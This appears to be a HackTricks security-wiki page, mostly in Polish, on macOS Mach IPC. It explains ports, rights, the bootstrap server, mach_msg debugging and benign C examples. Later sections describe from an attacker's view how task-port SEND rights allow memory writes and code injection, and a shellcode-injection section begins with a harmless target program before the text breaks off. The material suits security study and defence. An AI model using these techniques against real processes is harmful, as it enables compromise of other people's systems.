# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach używa **tasks** jako **najmniejszej jednostki** do dzielenia zasobów, a każdy task może zawierać **wiele wątków**. Te **tasks i threads są mapowane 1:1 do POSIX processes i threads**.

Komunikacja między taskami odbywa się poprzez Mach Inter-Process Communication (IPC), wykorzystując jednostronne kanały komunikacyjne. **Wiadomości są przesyłane między ports**, które działają jak kolejki wiadomości zarządzane przez kernel.

**Port** jest podstawowym elementem Mach IPC. Może być używany do **wysyłania i odbierania wiadomości**.

Każdy proces ma **IPC table**, w której można znaleźć **mach ports procesu**. Nazwa mach portu to w rzeczywistości liczba (wskazanie na obiekt jądra).

Proces może także wysłać nazwę portu wraz z pewnymi prawami **do innego taska**, a kernel utworzy wpis w **IPC table innego taska**.

### Port Rights

Port rights, które definiują jakie operacje task może wykonać, są kluczowe dla tej komunikacji. Możliwe **port rights** są ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, które pozwala odbierać wiadomości wysyłane do portu. Mach ports są MPSC (multiple-producer, single-consumer) kolejkami, co oznacza, że w całym systemie może istnieć **tylko jedno Receive right dla każdego portu** (w przeciwieństwie do pipe, gdzie wiele procesów może posiadać deskryptory do końca read jednego pipe).
- Task posiadający **Receive** right może odbierać wiadomości i **tworzyć Send rights**, pozwalając mu na wysyłanie wiadomości. Początkowo tylko **własny task ma Receive right nad swoim portem**.
- Jeśli właściciel Receive right **umiera** lub traci go, **send right staje się bezużyteczny (dead name).**
- **Send right**, które pozwala wysyłać wiadomości do portu.
- Send right może być **klonowany**, więc task będący właścicielem Send right może sklonować prawo i **przyznać je trzeciemu taskowi**.
- Zauważ, że **port rights** mogą być również **przekazywane** przez Mach messages.
- **Send-once right**, które pozwala wysłać jedną wiadomość do portu, a następnie znika.
- To prawo **nie może** być **klonowane**, ale może być **przenoszone**.
- **Port set right**, które oznacza _port set_ zamiast pojedynczego portu. Usunięcie (dequeuing) wiadomości z port set usuwa wiadomość z jednego z portów, które zawiera. Port sets mogą być używane do nasłuchiwania na kilku portach jednocześnie, podobnie jak `select`/`poll`/`epoll`/`kqueue` w Unix.
- **Dead name**, które nie jest faktycznym port right, a jedynie placeholderem. Gdy port zostanie zniszczony, wszystkie istniejące port rights do tego portu zmieniają się w dead names.

**Tasks mogą przekazywać SEND rights innym**, umożliwiając im wysyłanie wiadomości zwrotnych. **SEND rights mogą być również klonowane, więc task może zduplikować i przekazać prawo trzeciemu taskowi**. W połączeniu z procesem pośredniczącym znanym jako **bootstrap server**, umożliwia to efektywną komunikację między taskami.

### File Ports

File ports pozwalają na enkapsulację file descriptors w Mac ports (używając Mach port rights). Możliwe jest utworzenie `fileport` z danego FD używając `fileport_makeport` i utworzenie FD z fileport używając `fileport_makefd`.

### Establishing a communication

Jak wspomniano wcześniej, możliwe jest wysyłanie praw używając Mach messages, jednak **nie można wysłać prawa bez uprzedniego posiadania prawa** do wysłania Mach message. Zatem, jak nawiązywana jest pierwsza komunikacja?

W tym celu zaangażowany jest **bootstrap server** (**launchd** w mac), ponieważ **każdy może uzyskać SEND right do bootstrap server**, możliwe jest poproszenie go o prawo do wysyłania wiadomości do innego procesu:

1. Task **A** tworzy **nowy port**, uzyskując **RECEIVE right** nad nim.
2. Task **A**, będąc posiadaczem RECEIVE right, **generuje SEND right dla tego portu**.
3. Task **A** nawiązuje **połączenie** z **bootstrap server**, i **wysyła mu SEND right** dla portu, który wygenerował na początku.
- Pamiętaj, że każdy może uzyskać SEND right do bootstrap server.
4. Task A wysyła wiadomość `bootstrap_register` do bootstrap server, aby **skojarzyć dany port z nazwą** jak `com.apple.taska`
5. Task **B** wchodzi w interakcję z **bootstrap server**, wykonując bootstrap **lookup dla nazwy usługi** (`bootstrap_lookup`). Aby bootstrap server mógł odpowiedzieć, task B wyśle mu **SEND right do portu, który wcześniej stworzył** w wiadomości lookup. Jeśli lookup powiedzie się, **server zdubluje otrzymany SEND right** od Task A i **przekazuje go Taskowi B**.
- Pamiętaj, że każdy może uzyskać SEND right do bootstrap server.
6. Z tym SEND right, **Task B** jest w stanie **wysłać** **wiadomość** **do Task A**.
7. Dla komunikacji dwukierunkowej zazwyczaj Task **B** generuje nowy port z **RECEIVE** right i **SEND** right, i daje **SEND right Taskowi A**, aby mógł wysyłać wiadomości do TASK B (komunikacja dwukierunkowa).

Bootstrap server **nie może uwierzytelnić** nazwy usługi zgłaszanej przez task. Oznacza to, że **task** potencjalnie może **podszyć się pod dowolny systemowy task**, na przykład fałszywie **twierdząc, że jest serwisem autoryzacji** i następnie zatwierniać każde żądanie.

Apple przechowuje **nazwy usług dostarczanych przez system** w bezpiecznych plikach konfiguracyjnych, znajdujących się w katalogach chronionych przez **SIP**: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Obok każdej nazwy usługi przechowywany jest również **powiązany binarny plik**. Bootstrap server utworzy i będzie trzymać **RECEIVE right dla każdej z tych nazw usług**.

Dla tych predefiniowanych usług, **proces lookup różni się nieco**. Kiedy nazwa usługi jest wyszukiwana, launchd uruchamia usługę dynamicznie. Nowy przebieg działań wygląda następująco:

- Task **B** inicjuje bootstrap **lookup** dla nazwy usługi.
- **launchd** sprawdza czy task jest uruchomiony i jeśli nie jest, **uruchamia** go.
- Task **A** (usługa) wykonuje **bootstrap check-in** (`bootstrap_check_in()`). Tutaj **bootstrap** server tworzy SEND right, zatrzymuje go i **przenosi RECEIVE right do Task A**.
- launchd duplikuje **SEND right i wysyła go do Task B**.
- Task **B** generuje nowy port z **RECEIVE** right i **SEND** right, i przekazuje **SEND right Task A** (svc), aby mógł wysyłać wiadomości do TASK B (komunikacja dwukierunkowa).

Jednak ten proces dotyczy tylko predefiniowanych systemowych tasków. Zadania nie-systemowe nadal działają jak opisano pierwotnie, co potencjalnie może pozwolić na podszywanie się.

> [!CAUTION]
> Therefore, launchd should never crash or the whole sysem will crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcja `mach_msg`, będąca w istocie wywołaniem systemowym, jest używana do wysyłania i odbierania Mach messages. Funkcja wymaga, aby wysyłana wiadomość była pierwszym argumentem. Ta wiadomość musi zaczynać się od struktury `mach_msg_header_t`, po której następuje właściwa treść wiadomości. Struktura jest zdefiniowana następująco:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesy posiadające _**receive right**_ mogą odbierać wiadomości na porcie Mach. Z kolei **senders** otrzymują _**send**_ lub _**send-once right**_. Prawo _**send-once right**_ jest przeznaczone wyłącznie do wysłania jednej wiadomości, po czym staje się nieważne.

Początkowe pole **`msgh_bits`** jest bitmapą:

- Pierwszy bit (najbardziej znaczący) jest używany do wskazania, że wiadomość jest złożona (więcej na ten temat poniżej)
- 3. i 4. bity są używane przez kernel
- **5 najmniej znaczących bitów 2. bajtu** mogą być użyte dla **voucher**: innego typu portu do wysyłania par klucz/wartość.
- **5 najmniej znaczących bitów 3. bajtu** mogą być użyte dla **local port**
- **5 najmniej znaczących bitów 4. bajtu** mogą być użyte dla **remote port**

Typy, które mogą być określone w voucher, local i remote ports to (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

Aby uzyskać prostą **komunikację dwukierunkową**, proces może określić w mach **message header** **mach port** nazwany _reply port_ (**`msgh_local_port`**), na który odbiorca wiadomości może wysłać odpowiedź na tę wiadomość.

> [!TIP]
> Zauważ, że tego rodzaju komunikacja dwukierunkowa jest używana w wiadomościach XPC, które oczekują odpowiedzi (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Jednak **zwykle tworzy się różne porty**, jak wyjaśniono wcześniej, aby utworzyć komunikację dwukierunkową.

The other fields of the message header are:

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

> [!CAUTION]
> Zwróć uwagę, że **mach messages are sent over a `mach port`**, który jest kanałem komunikacyjnym w jądrze mach o charakterze **pojedynczy odbiorca**, **wielu nadawców**. **Wiele procesów** może **wysyłać wiadomości** do mach port, ale w danym momencie tylko **pojedynczy proces może je odczytać**.

Wiadomości są zatem tworzone przez nagłówek **`mach_msg_header_t`**, po którym następuje **body** oraz **trailer** (jeżeli występuje) i mogą one nadawać uprawnienie do odpowiedzi. W takich przypadkach jądro musi jedynie przekazać wiadomość z jednego zadania do drugiego.

A **trailer** to **informacja dodawana do wiadomości przez jądro** (nie może być ustawiona przez użytkownika), którą można zażądać przy odbiorze wiadomości za pomocą flag `MACH_RCV_TRAILER_<trailer_opt>` (można zażądać różnych rodzajów informacji).

#### Złożone wiadomości

Istnieją jednak inne, bardziej **złożone** wiadomości, takie jak te przekazujące dodatkowe prawa do portu lub współdzielące pamięć, gdzie jądro musi również wysłać te obiekty do odbiorcy. W tych przypadkach ustawiany jest najbardziej znaczący bit nagłówka `msgh_bits`.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
W 32-bitach wszystkie deskryptory mają 12B, a typ deskryptora znajduje się w 11. bajcie. W 64-bitach rozmiary się różnią.

> [!CAUTION]
> Jądro skopiuje deskryptory z jednego tasku do drugiego, ale najpierw **tworząc kopię w pamięci jądra**. Ta technika, znana jako "Feng Shui", była nadużywana w kilku exploitach, aby sprawić, że **jądro skopiuje dane do swojej pamięci**, powodując, że proces wyśle deskryptory do samego siebie. Potem proces może odebrać wiadomości (jądro je zwolni).
>
> Możliwe jest też **wysłanie praw do portu do podatnego procesu**, i prawa do portu po prostu pojawią się w procesie (nawet jeśli on ich nie obsługuje).

### API portów Mach

Zauważ, że porty są powiązane z namespace tasku, więc aby utworzyć lub wyszukać port, sprawdzany jest też namespace tasku (więcej w `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Utwórz** port.
- `mach_port_allocate` może też utworzyć **port set**: prawo odbioru nad grupą portów. Kiedy wiadomość jest odebrana, wskazywany jest port, z którego pochodzi.
- `mach_port_allocate_name`: Zmień nazwę portu (domyślnie 32-bitowy integer)
- `mach_port_names`: Pobierz nazwy portów z docelowego tasku
- `mach_port_type`: Uzyskaj prawa tasku względem nazwy
- `mach_port_rename`: Zmień nazwę portu (jak dup2 dla FD)
- `mach_port_allocate`: Przydziel nowe RECEIVE, PORT_SET lub DEAD_NAME
- `mach_port_insert_right`: Utwórz nowe prawo w porcie, w którym masz RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funkcje używane do **wysyłania i odbierania mach messages**. Wersja overwrite pozwala określić inny bufor do odbioru wiadomości (druga wersja po prostu go ponownie użyje).

### Debugowanie mach_msg

Ponieważ funkcje **`mach_msg`** i **`mach_msg_overwrite`** są tymi używanymi do wysyłania i odbierania wiadomości, ustawienie breakpointa na nich pozwoli na zbadanie wysłanych i odebranych wiadomości.

Na przykład rozpocznij debugowanie dowolnej aplikacji, którą możesz debugować, ponieważ załaduje ona **`libSystem.B`, która użyje tej funkcji**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Aby uzyskać argumenty **`mach_msg`** sprawdź rejestry. Oto argumenty (z [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Pobierz wartości z rejestrów:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Sprawdź nagłówek wiadomości, sprawdzając pierwszy argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Taki typ `mach_msg_bits_t` jest bardzo powszechny i umożliwia odpowiedź.

### Enumeracja portów
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**nazwa** to domyślna nazwa przypisana do portu (zauważ, jak rośnie w pierwszych 3 bajtach). **`ipc-object`** to **zaciemniony** unikalny **identyfikator** portu.\
Zauważ także, jak porty mające tylko prawo **`send`** **identyfikują właściciela** (nazwa portu + pid).\
Zwróć też uwagę na użycie **`+`** do wskazania **innych zadań połączonych z tym samym portem**.

Można także użyć [**procesxp**](https://www.newosxbook.com/tools/procexp.html) aby zobaczyć również **zarejestrowane nazwy usług** (z wyłączonym SIP z powodu potrzeby `com.apple.system-task-port`):
```
procesp 1 ports
```
Możesz zainstalować to narzędzie na iOS, pobierając je z [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Przykład kodu

Zwróć uwagę, jak **sender** **allocates** port, tworzy **send right** o nazwie `org.darlinghq.example` i wysyła ją do **bootstrap server**, podczas gdy **sender** zażądał **send right** tej nazwy i użył jej, aby **send a message**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Uprzywilejowane porty

Istnieją specjalne porty, które pozwalają **wykonywać pewne wrażliwe działania lub uzyskać dostęp do pewnych wrażliwych danych**, jeśli zadania mają nad nimi uprawnienia **SEND**. Czyni to te porty bardzo interesującymi z perspektywy atakującego, nie tylko ze względu na możliwości, ale także dlatego, że uprawnienia **SEND** można udostępniać między zadaniami.

### Specjalne porty hosta

Te porty są reprezentowane przez numer.

**SEND** rights można uzyskać wywołując **`host_get_special_port`**, a **RECEIVE** rights — wywołując **`host_set_special_port`**. Jednak oba wywołania wymagają portu **`host_priv`**, do którego dostęp ma tylko root. Co więcej, w przeszłości root mógł wywołać **`host_set_special_port`** i przejąć dowolny port, co pozwalało np. obejść podpisy kodu poprzez przejęcie `HOST_KEXTD_PORT` (SIP teraz temu zapobiega).

Są podzielone na 2 grupy: pierwsze 7 portów należy do jądra — 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` oraz 7 `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Te zaczynające się **od** numeru **8** są **własnością demonów systemowych** i można je znaleźć zadeklarowane w [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Jeśli proces ma uprawnienie **SEND** do tego portu, może uzyskać **informacje** o **systemie** wywołując jego rutyny, takie jak:
- `host_processor_info`: Get processor info
- `host_info`: Get host info
- `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH_VMDEBUG)
- `host_statistics`: Get host statistics
- `mach_memory_info`: Get kernel memory layout
- **Host Priv port**: Proces z uprawnieniem **SEND** do tego portu może wykonać **uprzywilejowane działania**, takie jak wyświetlanie danych rozruchowych lub próba załadowania kernel extension. Proces musi być **root**, aby otrzymać to uprawnienie.
- Ponadto, aby wywołać API **`kext_request`**, potrzebne są dodatkowe entitlements **`com.apple.private.kext*`**, które są przyznawane tylko binariom Apple.
- Inne rutyny, które można wywołać, to:
- `host_get_boot_info`: Pobiera `machine_boot_info()`
- `host_priv_statistics`: Pobiera uprzywilejowane statystyki
- `vm_allocate_cpm`: Alokuje ciągłą pamięć fizyczną
- `host_processors`: Przyznaje prawo SEND do procesorów hosta
- `mach_vm_wire`: Uczynić pamięć residentną
- Ponieważ **root** może uzyskać to uprawnienie, może wywołać `host_set_[special/exception]_port[s]`, aby **przejąć specjalne porty hosta lub porty wyjątków**.

Można zobaczyć wszystkie specjalne porty hosta, uruchamiając:
```bash
procexp all ports | grep "HSP"
```
### Specjalne porty Task

Są to porty zarezerwowane dla dobrze znanych usług. Można je pobrać/ustawić wywołując `task_[get/set]_special_port`. Znajdują się w `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Z [tutaj](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**[task-self send right]: The port used to control this task. Used to send messages that affect the task. This is the port returned by **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**[bootstrap send right]: The task's bootstrap port. Used to send messages requesting return of other system service ports.
- **TASK_HOST_NAME_PORT**[host-self send right]: The port used to request information of the containing host. This is the port returned by **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**[ledger send right]: The port naming the source from which this task draws its wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**[ledger send right]: The port naming the source from which this task draws its default memory managed memory.

### Task Ports

Originally Mach didn't have "processes" it had "tasks" which was considered more like a container of threads. When Mach was merged with BSD **each task was correlated with a BSD process**. Therefore every BSD process has the details it needs to be a process and every Mach task also have its inner workings (except for the inexistent pid 0 which is the `kernel_task`).

There are two very interesting functions related to this:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Get a SEND right for the task por of the task related to the specified by the `pid` and give it to the indicated `target_task_port` (which is usually the caller task which has used `mach_task_self()`, but could be a SEND port over a different task.)
- `pid_for_task(task, &pid)`: Given a SEND right to a task, find to which PID this task is related to.

In order to perform actions within the task, the task needed a `SEND` right to itself calling `mach_task_self()` (which uses the `task_self_trap` (28)). With this permission a task can perform several actions like:

- `task_threads`: Get SEND right over all task ports of the threads of the task
- `task_info`: Get info about a task
- `task_suspend/resume`: Suspend or resume a task
- `task_[get/set]_special_port`
- `thread_create`: Create a thread
- `task_[get/set]_state`: Control task state
- and more can be found in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Zauważ, że mając SEND right do portu zadania (task port) **innego taska**, możliwe jest wykonywanie takich operacji na tym innym tasku.

Moreover, the task_port is also the **`vm_map`** port which allows to **read an manipulate memory** inside a task with functions such as `vm_read()` and `vm_write()`. This basically means that a task with SEND rights over the task_port of a different task is going to be able to **inject code into that task**.

Remember that because the **kernel is also a task**, if someone manages to get a **SEND permissions** over the **`kernel_task`**, it'll be able to make the kernel execute anything (jailbreaks).

- Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) while doing a `fork()`.
- These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
- If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
- Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
- **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).

**The task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.

### Thread Ports

Threads also have associated ports, which are visible from the task calling **`task_threads`** and from the processor with `processor_set_threads`. A SEND right to the thread port allows to use the function from the `thread_act` subsystem, like:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Any thread can get this port calling to **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

You can grab a shellcode from:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
